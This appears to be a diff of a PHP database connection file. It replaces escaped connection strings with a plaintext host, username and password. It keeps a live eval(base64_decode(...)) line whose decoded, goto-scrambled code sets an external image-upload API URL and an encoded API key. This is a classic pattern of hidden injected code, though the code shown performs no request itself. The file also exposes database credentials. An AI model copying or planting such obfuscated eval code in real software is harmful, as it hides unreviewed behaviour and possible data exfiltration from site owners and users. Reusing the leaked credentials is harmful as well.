@@ -1,5 +1,5 @@
 <?php
-    $conn = mysqli_connect("127.0.0.1", "\167\164\x6a\155\x64\x6e\x61\x63\x5f\x66\x75\x63\x68\x73\151\x61", "\x6e\147\165\x79\x65\156\164\150\141\156\150\143\157\156\x67", "\167\x74\x6a\x6d\144\x6e\141\x63\x5f\x66\x75\x63\x68\x73\151\141");
+    $conn = mysqli_connect("localhost", "wtjmdnac_fuchsia", "nguyenthanhcong", "wtjmdnac_fuchsia");
     mysqli_set_charset($conn, "utf8mb4"); //SIMPLE FIX WTF
     eval(base64_decode('CiBnb3RvIFlwU0ljOyBZcFNJYzogZ290byBuX1gxZTsgZ290byBCU3JlNzsgU1VFNHk6ICR1cmwgPSAiXDE1MFx4NzRceDc0XDE2MFwxNjNceDNhXDU3XHgyZlx4NjFceDcwXDE1MVx4MmVceDY5XDE1NVx4NjdcMTQyXHg2Mlx4MmVcMTQzXDE1N1x4NmRceDJmXHgzMVw1N1x4NzVceDcwXHg2Y1x4NmZceDYxXHg2NCI7IGdvdG8gcU9iZUg7IHFPYmVIOiBnb3RvIHlkN3pvOyBnb3RvIG5jaVhJOyBCU3JlNzogbl9YMWU6IGdvdG8gWFZ3dUE7IExKcFpPOiBGckVTNzogZ290byBTVUU0eTsgbmNpWEk6IHlkN3pvOiBnb3RvIGt2TlFnOyBYVnd1QTogJGFwaWtleSA9ICJceDM5XHgzNVw2Mlx4MzdceDYxXDYxXDE0M1w2NVx4MzFcNjZcMTQ0XHg2NFx4MzJcMTQ2XDE0M1x4NjFcNjZcNjVcNjVcNjFcNjJcNjRcNjBceDYyXHg2MVx4MzhcNzFcNjNceDM0XDYzXHg2M1wxNDEiOyBnb3RvIFVWT05LOyBVVk9OSzogZ290byBGckVTNzsgZ290byBMSnBaTzsga3ZOUWc6IA=='));
 ?>
